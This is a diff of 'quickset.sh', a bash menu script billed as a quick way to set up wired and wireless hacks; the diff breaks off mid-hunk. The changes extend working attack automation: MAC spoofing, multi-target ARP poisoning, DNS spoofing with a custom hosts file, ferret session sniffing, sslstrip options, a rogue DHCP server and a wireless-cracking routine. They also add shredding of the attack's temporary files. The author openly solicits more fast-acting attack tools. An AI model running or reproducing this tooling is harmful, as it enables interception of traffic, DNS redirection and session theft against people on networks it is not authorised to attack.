@@ -1,6 +1,5 @@
 #!/bin/bash
-function script_info()
-{
+function script_info(){
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: quickset.sh
 ## Copyright (C) <2009>  <Snafu>
@@ -48,31 +47,27 @@ function script_info()
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Last command issued syntax is below.  How can I make it show the value of the variables?.....
-## history | tail -n 2 | head -n 1 | awk '{$1=""; print $0}'
-
 ## WOULD LIKE TO IMPLEMENT MORE FAST ACTING ATTACK TOOLS THAT REQUIRE LITTLE TO NO SETUP.  If you have a tool you would like added to this script please contact me
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Implementation of ip_mac-- for MAC address checking
-
-## Custom hosts file capability for dnsspoof
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## DHCP server shows itself being launched even if it isn't, need to make it say launched only if/when it really does launch.
-
 ## Figure out if old PIDs are used during a power cycle...if not we'll do PID assignments to ensure kill -9s
+
 ## Use PIDs to make a greppable list 
 
-### `ifconfig mon0 | grep HWaddr | cut -d- -f1-6 | sed 's/-/:/g'` is much cleaner syntax for random mac usage....
-
-## Add option to kill modified files like dhcp leases at the end of session if exited properly....
+## Add option to kill modified files like dhcp leases at the end of session if exited properly.  This has mostly been done, with the exception of some of the aircrack-ng files that are created during usage of wifi_101--()
 
 ## Implementation of IP check functionality for multiple tgts on arpspoof_II--(), ip range & custom dns entries on dhcp_svr--()
+
+## ip_mac--() needs to be vetted to where it will only accept four octects.  As of now, it does proper checking with regards to 0-255, however it will let ANY amount of octects pass -vs- the proper usage of four octects
+
+## Tweak up wacg--() to allow for a null victim mac entry to exit out of the function and the pause that would follow otherwise..,
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
@@ -108,7 +103,13 @@ function script_info()
 ## On 20 February 2012, the ranges for MTU value have been confirmed to be between 42 - 6122.  This check feature has now been fully implemented.
 ##As well, quickset.sh was opened to the world with respect towards allowed frequencies for WiFi.  quickset.sh will now allow a user to choose channels 1-14, versus the old way of using only 1-11.  Be advised though, I do not feel like writing a check function to make sure yer regulatory agent allows a specific channel.  It is up to you to set the regulatory agent via iw prior to choosing a channel.  ie...  If you have an american laptop, by default, channel 1-11 will be available to you.  Trying to choose channel 12 will probably result in a failure of quickset.sh of some type, not sure and do not care enough to figure this out right now.  Just make sure you have set it prior to using quickset.sh and you will be good to go.
 
-## On 20 March 2012, quickset.sh once again became an even numbered version indicating to users that all known bugs have been worked out with the previous bug caused by the addition of a function allowing for implementation of using custom DNS servers with dhcp3-server!  It's still not perfect sailing as I have not implemented the ip_mac--() function into this just yet, the user could still jack this up, but I will implement this when I get the time.  Version 3.0 has been a long time coming and it needs to drop into the wild ASAP!
+## On 20 March 2012, quickset.sh once again became an even numbered version indicating to users that all known bugs have been worked out with the previous bug caused by the addition of a function allowing for implementation of using custom DNS servers with dhcp3-server!  It's still not perfect sailing as I have not implemented the ip_mac--() function into this just yet, the user could still jack this up, but I will implement this when I get the time.
+
+## As of 3.4:
+## A channel checking feature was implemented to speed up the users decision with regards to channel switching
+## An internet connectivity and monitor mode check was implemented during startup 
+## dnsspoof has been given the ability to use custom hosts for the configuration file
+## When using wacg--(), you must have a victim MAC to enter in, otherwise the script will pause.  In other words, do not (C)ontinue if there is not a vic to choose from...
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
@@ -149,6 +150,10 @@ function script_info()
 ## bugme:
 ## Catching the hamster bug whereby if hamster.txt existed, the script just quit out.  Thanks!
 
+## b33f:
+## Much of the wacg--() functionality is straight from the WACg.sh script, I mostly tweaked how the function flows within itself for my script's purposes.  All the credit for the idea itself goes straight to b33f.  Mad Props and Kudos...
+
+
 ## My wife:
 ## For always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -164,7 +169,7 @@ echo -e "$INS\nUsage: ./quickset.sh"
 
 init_setup--()
 {
-kill_mon= ## Nulled
+kill_mon=
 clear
 echo -e "$INS\n--------------------------------------------------------------------------------------
          Only Certain Modes in this Script Require Both Devices to be Defined
@@ -195,7 +200,7 @@ case $init_var in
 	dev_check_var=$ie
 	dev_check--
 	if [[ $dev_check == "fail" ]];then
-		ie= ## Nulled
+		ie=
 	fi
 
 	init_setup--;;
@@ -205,7 +210,7 @@ case $init_var in
 	dev_check_var=$pii
 	dev_check--
 	if [[ $dev_check == "fail" ]];then
-		pii= ## Nulled
+		pii=
 	fi
 
 	init_setup--;;
@@ -233,7 +238,7 @@ esac
 
 monitormode--()
 {
-var= ## Nulled
+var=
 km= ## Device to kill
 clear
 echo -e "$OUT"
@@ -270,20 +275,20 @@ if [[ $kill_mon == "kill" ]];then
 			return
 		fi
 
-	while [ -z $var ];do
+	while [[ -z $var ]];do
 		echo -e "$INP\nWhat Physical Device is $OUT$km$INP Associated With?"
 		read var
 		dev_check_var=$var
 		dev_check--
 		if [[ $dev_check == "fail" ]];then
-			var= ## Nulled
+			var=
 		fi
 
 	done
 
 	echo -e "$OUT"
 	airmon-ng stop $km && airmon-ng stop $var
-	pii= ## Nulled
+	pii=
 	echo -e "$INS\n\nPress Enter to Continue"
 	read
 else
@@ -329,10 +334,10 @@ mac_control--()
 
 	mac_control_II--()
 	{
-	mac_dev= ## Nulled
-	mac_devII= ## Nulled
-	rand= ## Nulled
-	var_II= ## Nulled
+	mac_dev=
+	mac_devII=
+	rand=
+	var_II=
 	sam= ## Variable for SoftAP MAC address
 	clear
 	echo -e "$WRN\n
@@ -354,18 +359,18 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 
 	fi
 
-	while [ -z $rand ];do
+	while [[ -z $rand ]];do
 		echo -e "$INP\nRandom MAC? (y or n)"
 		read rand
 		case $rand in
 			y|Y) ;;
 
-			n|N) while [ -z $sam ];do
+			n|N) while [[ -z $sam ]];do
 				echo -e "$INP\nDesired MAC Address for $OUT$mac_dev$INP?   (\033[1;32mi.e. aa:bb:cc:dd:ee:ff$INP)"
 				read sam
 			done;;
 
-			*) rand= ;; ## Nulled
+			*) rand= ;;
 		esac
 
 	done
@@ -375,20 +380,20 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 		read var
 		case $var in
 			n|N|y|Y) var_II="x" ;;
-			*) var_II= ;; ## Nulled
+			*) var_II= ;;
 		esac
 
 	done
 
 	case $var in
 		y|Y) case $rand in
-			y|Y) while [ -z $mac_devII ];do
+			y|Y) while [[ -z $mac_devII ]];do
 				echo -e "$INP\nMonitor Mode NIC name?"
 				read mac_devII
 				dev_check_var=$mac_devII
 				dev_check--
 				if [[ $dev_check == "fail" ]];then
-					mac_devII= ## Nulled
+					mac_devII=
 				fi
 
 			done
@@ -398,7 +403,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			clear
 			echo -e "$OUT\n--------------------\nChanging MAC Address\n--------------------"
 			echo -e "$OUT\n$mac_dev `macchanger -r $mac_dev`"
-			if [ $? -ne 0 ];then
+			if [[ $? -ne 0 ]];then
 				echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
 				sleep .7
@@ -407,7 +412,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 				rand_mac=$(ifconfig $mac_dev | awk '{print $5}')
 				rand_mac=$(echo $rand_mac | awk '{print $1}')
 				echo -e "$OUT\n$mac_devII `macchanger -m $rand_mac $mac_devII`"
-				if [ $? -ne 0 ];then
+				if [[ $? -ne 0 ]];then
 					echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 					ifconfig $mac_devII up
 					sleep .7
@@ -422,14 +427,14 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 
 			fi;;
 
-			n|N) mac_devII= ## Nulled
-			while [ -z $mac_devII ];do
+			n|N) mac_devII=
+			while [[ -z $mac_devII ]];do
 				echo -e "$INP\nMonitor Mode NIC name?"
 				read mac_devII
 				dev_check_var=$mac_devII
 				dev_check--
 				if [[ $dev_check == "fail" ]];then
-					mac_devII= ## Nulled
+					mac_devII=
 				fi
 
 			done
@@ -439,14 +444,14 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			clear
 			echo -e "$OUT\n--------------------\nChanging MAC Address\n--------------------"
 			echo -e "$OUT\n$mac_dev `macchanger -m $sam $mac_dev`"
-			if [ $? -ne 0 ];then
+			if [[ $? -ne 0 ]];then
 				echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
 				sleep .7
 				mac_control--
 			else
 				echo -e "$OUT\n$mac_devII `macchanger -m $sam $mac_devII`"
-				if [ $? -ne 0 ];then
+				if [[ $? -ne 0 ]];then
 					echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 					ifconfig $mac_devII up
 					sleep .7
@@ -463,13 +468,12 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 
 		esac;;
 
-		n|N)
-		case $rand in
+		n|N) case $rand in
 			y|Y) ifconfig $mac_dev down
 			clear
 			echo -e "$OUT\n--------------------\nChanging MAC Address\n--------------------"
 			echo -e "$OUT\n$mac_dev `macchanger -r $mac_dev`"
-			if [ $? -ne 0 ];then
+			if [[ $? -ne 0 ]];then
 				echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
 				sleep .7
@@ -485,7 +489,7 @@ This script requires Physical and Virtual devices to have matching MAC Addresses
 			clear
 			echo -e "$OUT\n--------------------\nChanging MAC Address\n--------------------"
 			echo -e "$OUT\n$mac_dev `macchanger -m $sam $mac_dev`"
-			if [ $? -ne 0 ];then
+			if [[ $? -ne 0 ]];then
 				echo -e "$WRN\nThe Attempt was Unsuccessful, Try Again"
 				ifconfig $mac_dev up
 				sleep .7
@@ -524,7 +528,7 @@ case $var in
 
 	p|P) case $init_var in
 		6) init_setup--;;
-		*) init_var= ## Nulled
+		*) init_var=
 		setups--;;
 	esac;;
 
@@ -537,12 +541,13 @@ esac
 dev_check--()
 {
 ifconfig $dev_check_var > /dev/null
-if [ $? -ne 0 ];then
+if [[ $? -ne 0 ]];then
+	clear
 	echo -e "$WRN\nDevice does NOT exist"
 	sleep 1
 	dev_check="fail"
 else
-	dev_check= ## Nulled
+	dev_check=
 fi
 }
 
@@ -569,16 +574,16 @@ case $1 in
 		case $dev_parent in
 			venue--)
 			if [[ $dev_check == "fail" ]];then
-				pii= ## Nulled
-				var= ## Nulled
+				pii=
+				var=
 			fi
 
 			sm=$(ifconfig $pii | grep --color=never HWaddr | awk '{print $5}' | cut -c1-17 | tr [:upper:] [:lower:] | sed 's/-/:/g');;
 
 			routing--)
 			if [[ $dev_check == "fail" ]];then
-				pii= ## Nulled
-				rte_choice= ## Nulled
+				pii=
+				rte_choice=
 			fi;;
 
 		esac;;
@@ -586,10 +591,10 @@ case $1 in
 		*) 
 		case $dev_parent in
 			venue--) 
-			var= ;; ## Nulled
+			var= ;;
 
 			routing--) 
-			rte_choice= ;; ## Nulled
+			rte_choice= ;;
 		esac;;
 
 	esac;;
@@ -607,8 +612,8 @@ case $1 in
 		case $dev_parent in
 			routing--)
 			if [[ $dev_check == "fail" ]];then
-				ie= ## Nulled
-				rte_choice= ## Nulled
+				ie=
+				rte_choice=
 			fi;;
 
 		esac;;
@@ -621,13 +626,13 @@ case $1 in
 
 	esac;;
 
-esac
-}
+esac }
+
 
 fcheck--()
 {
 for_check=$(cat /proc/sys/net/ipv4/ip_forward)
-	if [[ $for_check = 0 ]];then
+	if [[ $for_check == 0 ]];then
 		clear
 		echo -e "$OUT\nKernel Forwarding is Not Enabled\n$INP\nMake it So? (y or n)"
 		read k_for_check
@@ -646,7 +651,7 @@ case $1 in
 	if [ $? -ne 0 ];then
 		ip_mac="fail"
 	else
-		ip_mac= ## Nulled
+		ip_mac=
 	fi
 
 	if [[ -z $ip_mac ]];then
@@ -656,7 +661,7 @@ case $1 in
 				ip_mac="fail"
 				break
 			else
-				ip_mac= ## Nulled
+				ip_mac=
 			fi
 
 		done
@@ -669,34 +674,72 @@ case $1 in
 		sleep 1
 	fi;;
 
-	mac) var=$2
+# 	mac) var=$2
 # 	echo $var | grep -iv [^g-z:]
 # 	if [ $? -ne 0 ];then
 # 		ip_mac="fail"
 # 	else
-# 		ip_mac= ## Nulled
+# 		ip_mac=
 # 	fi
-
-	if [[ -z $ip_mac ]];then
-		for (( i = 1 ; i < 5 ; i++ ));do
-			column=$(echo $var | cut -d . -f$i)
-			if [[ $column -lt 0 || $column -gt 255 ]];then
-				ip_mac="fail"
-				break
-			else
-				ip_mac= ## Nulled
-			fi
-
-		done
-
-	clear
-	fi
-
-	if [[ $ip_mac == "fail" ]];then
-		echo -e "$WRN\nMAC Address is not Valid"
-		sleep 1
-	fi;;
+# 
+# 	if [[ -z $ip_mac ]];then
+# 		for (( i = 1 ; i < 5 ; i++ ));do
+# 			column=$(echo $var | cut -d . -f$i)
+# 			if [[ $column -lt 0 || $column -gt 255 ]];then
+# 				ip_mac="fail"
+# 				break
+# 			else
+# 				ip_mac=
+# 			fi
+# 
+# 		done
+# 
+# 	clear
+# 	fi
+# 
+# 	if [[ $ip_mac == "fail" ]];then
+# 		echo -e "$WRN\nMAC Address is not Valid"
+# 		sleep 1
+# 	fi;;
 esac
+}
+
+tchan--()
+{
+#tc= ## tgt channel
+echo -e "$INP\nTgt Channel? (1-14)"
+read tc
+### Need to learn to case within range...Also learn if within range (with sanitization) [1-14]???
+case $tc in
+	1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
+
+	*) tc=
+	echo -e "$WRN\nYou Must Enter a Legitimate Channel to Proceed"
+	sleep 1.5
+	clear;;
+esac
+
+case $parent_IV in
+	dump) dump--;;
+esac
+
+case $parent_III in
+	rtech) parent_III= ## Nulled to prevent repeat looping that is NOT wanted!
+	rtech_II--;;
+esac
+
+case $parent_VI in
+	ctech) ctech_II--;;
+esac
+}
+
+chan_check--()
+{
+chan_res=$(iwlist $1 channel | grep Current | awk '{print $5}' | sed 's/)//')
+if [[ -z $chan_res ]];then
+	clear
+	echo -e "$OUT\nCurrent Channel for $1 is not Set"
+fi
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -724,11 +767,9 @@ QuickSet - A Quick Way to Setup a Wired/Wireless Hack
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 sleep 2.5
-ap_check= ## Nulled
+ap_check=
 init_setup--
 }
-
-
 
 main_menu--()
 {
@@ -875,18 +916,18 @@ M)ain Menu$HDR
 read rte_choice
 case $rte_choice in
 	3|5) dev_parent="routing--"
-	if [ -z $pii ];then
+	if [[ -z $pii ]];then
 		no_dev-- monitor
 	fi
 
-	if [ -z $ie ];then
+	if [[ -z $ie ]];then
 		no_dev-- managed
 	fi
 
 	fcheck--;;
 
 	4) dev_parent="routing--"
-	if [ -z $pii ];then
+	if [[ -z $pii ]];then
 		no_dev-- monitor
 	fi;;
 esac
@@ -922,14 +963,74 @@ esac
 cleanup--()
 {
 if [[ $dhcp_svr_stat == "active" ]]; then
-	echo -e "$INP\nPerform Cleanup of Hidden Processes? (y or n)"
+	echo -e "$INP\nPerform Cleanup of the DHCP Server? (y or n)"
 	read var
 	case $var in
-		y|Y) killall -9 dhcpd3;;
+		y|Y) cat /var/run/dhcpd/dhcpd.pid | xargs kill -9 > /dev/null 2>&1
+		if [[ $? == 0 ]];then
+			echo -e "$OUT\nDHCP Server Successfully Killed"
+		fi;;
+
 	esac
 
 fi
 
+if [[ $dhcp_tmp == 1 ]];then
+	var=0
+	while [[ $var == 0 ]];do
+		echo -e "$INP\nRemove $dhcpdconf? (y/n)"
+		read var
+		case $var in
+			y|Y) shred -uv $dhcpdconf
+			var=1 ;;
+
+			n|N) var=1 ;;
+
+			*) ;;
+		esac
+
+	done
+
+fi
+
+if [[ $dns_tmp == 1 ]];then
+	var=0
+	while [[ $var == 0 ]];do
+		echo -e "$INP\nRemove /tmp/dns_spf? (y/n)"
+		read var
+		case $var in
+			y|Y) shred -uv /tmp/dns_spf
+			var=1 ;;
+
+			n|N) var=1 ;;
+
+			*) ;;
+		esac
+
+	done
+
+fi
+
+if [[ $wacg_check == "active" ]];then
+var=0
+	while [[ $var == 0 ]];do
+		echo -e "$INP\nRemove temporary WACg Files? (y/n) $OUT{/tmp/WACg/*}"
+		read var
+		case $var in
+			y|Y) shred -uv /tmp/WACg/*
+			rm -rf /tmp/WACg
+			var=1 ;;
+
+			n|N) var=1 ;;
+
+			*) ;;
+		esac
+
+	done
+
+fi
+
+echo -e "\n\n\n"
 exit
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~ END main_menu-- functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
@@ -948,8 +1049,8 @@ Doing so requires that you rename them for this script to work properly$WRN
 $INP\nDo you wish to continue? (y) or (n)\n"
 read var
 case $var in
-	y|Y) ie= ## Nulled
-	pii= ## Nulled
+	y|Y) ie=
+	pii=
 	init_setup--;;
 	
 	n|N) setups--;;
@@ -966,14 +1067,14 @@ arpspoof--()
 	mass_arp--()
 	{
 	if [[ $arp_way == "yes" ]];then
-		while [ "$1" != "" ];do
+		while [[ "$1" != "" ]];do
 			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
 			Eterm -b black -f white --pause --title "ARP to $gt_way (GW) as $1" -e arpspoof -i $spoof_dev -t $gt_way $1 &
 			shift
 		done
 
 	else
-		while [ "$1" != "" ];do
+		while [[ "$1" != "" ]];do
 			Eterm -b black -f white --pause --title "ARP to $1 as $gt_way (GW)" -e arpspoof -i $spoof_dev -t $1 $gt_way &
 			shift 
 		done
@@ -987,7 +1088,7 @@ arpspoof--()
 
 	echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--ARPspoof Parameters--
+          --ARPspoof Parameters--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
 1) Spoofing NIC        [$OUT$spoof_dev$INP]
 
@@ -1002,7 +1103,7 @@ C)ontinue
 P)revious Menu
 
 M)ain Menu$HDR
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 	read var
 	case $var in
 		1) echo -e "$INP\nNIC?"
@@ -1010,7 +1111,7 @@ M)ain Menu$HDR
 			dev_check_var=$spoof_dev
 			dev_check--
 			if [[ $dev_check == "fail" ]];then
-				spoof_dev= ## Nulled
+				spoof_dev=
 			fi
 
 			arpspoof_II--;;
@@ -1019,7 +1120,7 @@ M)ain Menu$HDR
 		read gt_way
 		ip_mac-- ip $gt_way
 		if [[ $ip_mac == "fail" ]];then
-			gt_way= ## Nulled
+			gt_way=
 		fi
 
 		arpspoof_II--;;
@@ -1037,7 +1138,7 @@ S)ingle Tgt$HDR
 
 			m|M) echo -e "$INP\nSeperate Tgts with a space (i.e. IP1 IP2 IP3)"
 			read mult_tgts
-			while [ $var_II != "x" ];do
+			while [[ $var_II != "x" ]];do
 				echo -e "$INP\nTwo Way Spoof? (y or n)"
 				read _2way
 				case $_2way in
@@ -1046,7 +1147,7 @@ S)ingle Tgt$HDR
 
 					n|N) var_II="x";;
 
-					*) var_II= ;; ## Nulled
+					*) var_II= ;;
 				esac
 
 			done
@@ -1057,7 +1158,7 @@ S)ingle Tgt$HDR
 			read tgt_ip
 			ip_mac-- ip $tgt_ip
 			if [[ $ip_mac == "fail" ]];then
-				tgt_ip= ## Nulled
+				tgt_ip=
 			fi
 
 			if [[ -z $tgt_ip ]];then
@@ -1069,7 +1170,7 @@ S)ingle Tgt$HDR
 					case $_2way in 
 						y|Y|n|N) var_III="x";;
 
-						*) var_III= ;; ## Nulled
+						*) var_III= ;;
 					esac
 
 				done
@@ -1077,7 +1178,7 @@ S)ingle Tgt$HDR
 			tgt_style_II="Single Tgt"
 			fi;;
 
-			*) tgt_style_II=  ## Nulled
+			*) tgt_style_II=
 		esac
 
 		arpspoof_II--;;
@@ -1120,10 +1221,10 @@ S)ingle Tgt$HDR
 	esac
 	}
 
-var_II= ## Nulled
-var_III= ## Nulled
+var_II=
+var_III=
 spoof_dev=$ie ## Device to spoof with
-gt_way= ## Gateway IP variable
+gt_way=$(route -en | grep UG | awk '{print $2}' | head -n1) ## Gateway IP variable, defaulted to first gateway if available
 tgt_ip= ## Tgt IP variable
 mult_tgts= ## Variable to assign multiple IPs with
 arp_way= ## Variable to define Two-Way spoofing with multiple IPs
@@ -1138,12 +1239,17 @@ dnsspoof--()
 
 	dnsspoof_II--()
 	{
+	#dns_spf_array= Array for holding the custom DNS spoof inputs
+	#dns_spf_entry= Variable for index assignments within ${dns_spf_array[@]}
+	#dns_spf_total= Total number of indexes in the DNS Spoof array
 	clear
 	echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --DNSspoof Parameters--
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
 1) Listening NIC    [$OUT$dspoof_dev$INP]
+
+2) Custom Hostfile  [\033[1;33m$d_hosts\033[36m]
 
 2) List Available NICs
 
@@ -1160,23 +1266,44 @@ M)ain Menu$HDR
 		dev_check_var=$dspoof_dev
 		dev_check--
 		if [[ $dev_check == "fail" ]];then
-			dspoof_dev= ## Nulled
+			dspoof_dev=
 		fi
 	
 		dnsspoof_II--;;
 
-# 2) Custom Hostfile  [\033[1;33m$d_hosts\033[36m]
-# 		2) echo -e "\033[36m\nUse Custom DNS Hosts File? (y or n)"
-# 		read d_hosts
-# 		case $d_hosts in
-# 			y|Y) d_hosts="Yes" ;;
-# 			n|N) d_hosts="No" ;;
-# 			*) d_hosts= ;; ## Nulled
-# 		esac
-# 
-# 		dnsspoof_II--;;
+		2) echo -e "\033[36m\nUse Custom DNS Hosts File? (y or n)"
+		read d_hosts
+		case $d_hosts in
+			y|Y) d_hosts="Yes"
+			shred -u /tmp/dns_spf > /dev/null 2>&1
+			unset dns_spf_array
+			declare -a dns_spf_array
+			echo -e "$INS\nEnter each line of desired dnsspoof hostsfile\n(i.e. 192.168.1.1 foo.com).\nEnd with # on a new line.\n"
+			while :;do
+				read dns_spf_entry
+				if [[ $dns_spf_entry != \# ]];then
+					dns_spf_array=("${dns_spf_array[@]}" "$dns_spf_entry")
+				else
+					break
+				fi
 
-		2) nics--
+			done
+
+			dns_spf_total=$(echo ${#dns_spf_array[@]})
+			for (( i = 0 ; i < $dns_spf_total ; i++ ));do ## $i is a simple counter
+				echo ${dns_spf_array[$i]} >> /tmp/dns_spf
+			done
+
+			dns_tmp=1 ;; ## Variable for determining if /tmp/dns_spf has been created
+
+			n|N) d_hosts="No" ;;
+
+			*) d_hosts= ;;
+		esac
+
+		dnsspoof_II--;;
+
+		3) nics--
 		ferret_II--;;
 
 		c|C) if [[ -z $dspoof_dev || -z $d_hosts ]];then
@@ -1186,7 +1313,7 @@ M)ain Menu$HDR
 		else
 			fcheck--
 			case $d_hosts in
-				Yes) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
+				Yes) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev -f /tmp/dns_spf & 
 				atk_menu--;;
 
 				No) Eterm -b black -f white --pause --title "DNSspoof" -e dnsspoof -i $dspoof_dev & 
@@ -1203,8 +1330,8 @@ M)ain Menu$HDR
 	esac
 	}
 
-## Below sets my defaults, change as you wish
 dspoof_dev=$ie
+d_hosts="No"
 dnsspoof_II--
 }
 
@@ -1216,7 +1343,6 @@ ferret--()
 
 	ferret_II--()
 	{
-	#fer_chan= ## Channel to sniff on
 	clear
 	echo -e "$HDR
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1241,7 +1367,7 @@ M)ain Menu$HDR
 		dev_check_var=$fer_dev
 		dev_check--
 		if [[ $dev_check == "fail" ]];then
-			fer_dev= ## Nulled
+			fer_dev=
 		fi
 
 		ferret_II--;;
@@ -1255,7 +1381,7 @@ M)ain Menu$HDR
 			2) fer_type="Wired"
 			wifi_check="wired" ;;
 
-			*) var= ;; ## Nulled
+			*) var= ;;
 		esac
 
 		ferret_II--;;
@@ -1269,17 +1395,26 @@ M)ain Menu$HDR
 			ferret_II--
 		else
 			case $wifi_check in
-				wireless) fer_chan= ## Nulled
-				while [ -z $fer_chan ];do
-					echo -e "$INP\nWireless Channel to Sniff? (1-14)"
-					read fer_chan
-					case $fer_chan in
-						1|2|3|4|5|6|7|8|9|10|11|12|13|14) ;;
-						*) fer_chan= ;; ## Nulled
-					esac
-				done
+				wireless) var=
+					chan_check-- $fer_dev
+					if [[ -n $chan_res ]];then
+						echo -e "$OUT\nCurrent Channel is: $chan_res.  Would You Like to Change it? (y/n)"
+						read var
+					else
+						tchan--
+					fi
 
-				Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev --channel $fer_chan & 
+					case $var in
+						y|Y) tchan--;;
+						n|N) tc=$chan_res ;;
+						*) ferret_II--;;
+					esac
+
+				if [[ -z $tc ]];then
+					ferret_II--
+				fi
+
+				Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev --channel $tc & 
 				atk_menu--;;
 
 				wired) Eterm -b black -f white --pause --title "Ferret" -e ferret -i $fer_dev & 
@@ -1296,8 +1431,7 @@ M)ain Menu$HDR
 	esac
 	}
 
-## Below sets my defaults, change as you wish
-if [ -z $pii ];then
+if [[ -z $pii ]];then
 	fer_dev=$ie ## Set to internet conected NIC if no monitor mode device present
 else
 	fer_dev=$pii
@@ -1368,7 +1502,7 @@ M)ain Menu$HDR
 		1) echo -e "$INP\nDefine Listening Port"
 		read lst_port
 		if [[ $lst_port -lt 1 || $lst_port -gt 65535 ]];then
-			lst_port= ## Nulled
+			lst_port=
 			echo -e "$WRN\nPort Not Valid"
 			sleep 1
 		fi
@@ -1393,7 +1527,7 @@ M)ain Menu$HDR
 			1) log_opt="-p" ;;
 			2) log_opt="-s" ;;
 			3) log_opt="-a" ;;
- 			*) log_opt= ;; ## Nulled
+ 			*) log_opt= ;;
 		esac
 
 		strip_em_II--;;
@@ -1403,7 +1537,7 @@ M)ain Menu$HDR
 		case $lck_fav in
 			y|Y) lck_fav="Yes" ;;
 			n|N) lck_fav="No" ;;
-			*) lck_fav= ;; ## Nulled
+			*) lck_fav= ;;
 		esac
 
 		strip_em_II--;;
@@ -1413,7 +1547,7 @@ M)ain Menu$HDR
 		case $ses_kil in
 			y|Y) ses_kil="Yes" ;;
 			n|N) ses_kil="No" ;;
-			*) ses_kil= ;; ## Nulled
+			*) ses_kil= ;;
 		esac
 
 		strip_em_II--;;
@@ -1423,7 +1557,7 @@ M)ain Menu$HDR
 		case $ssl_tail in
 			y|Y) ssl_tail="Yes" ;;
 			n|N) ssl_tail="No" ;;
-			*) ssl_tail= ;; ## Nulled
+			*) ssl_tail= ;;
 		esac
 
 		strip_em_II--;;
@@ -1530,23 +1664,16 @@ dns_cus="No" ## Use custom DNS entries for DHCP server, defaulted to nameservers
 
 dhcp_svr--()
 {
-var= ## Nulled
+var=
 dhcp_svr_stat= ## Variable for Cleanup Purposes..
-dhcpdconf="/tmp/dhcpd.conf" ## Used by dhcpd3
+dhcpdconf="/tmp/dhcpd.conf" ## Temp file used by dhcpd3
 
 	dhcp_func--()
 	{
-
-		custom_dns--()
-		{
-		while [ "$1" != "" ];do
-			for sadns in $1;do
-				echo "option domain-name-servers $sadns;" >> /tmp/dhcpd.conf
-			done
-
-			shift
-		done
-		}
+	#dns_cus= Variable for determining if Custom DNS hosts are requested
+	#dns_cus_array= Array for holding the custom DNS hosts IP addresses
+	#dns_entry=Variable for index assignments within ${dns_cus_array[@]}
+	#dns_total= Total number of indexes in the Custom DNS hosts array
 
 	clear
 	echo -e "$HDR
@@ -1580,7 +1707,7 @@ M)ain Menu$HDR
 		dev_check_var=$dhcp_dev
 		dev_check--
 		if [[ $dev_check == "fail" ]];then
-			dhcp_dev= ## Nulled
+			dhcp_dev=
 		fi
 
 		dhcp_func--;;
@@ -1589,7 +1716,7 @@ M)ain Menu$HDR
 		read sapip
 		ip_mac-- ip $sapip
 		if [[ $ip_mac == "fail" ]];then
-			sapip= ## Nulled
+			sapip=
 		fi
 
 		dhcp_func--;;
@@ -1598,7 +1725,7 @@ M)ain Menu$HDR
 		read sasm
 		ip_mac-- ip $sasm
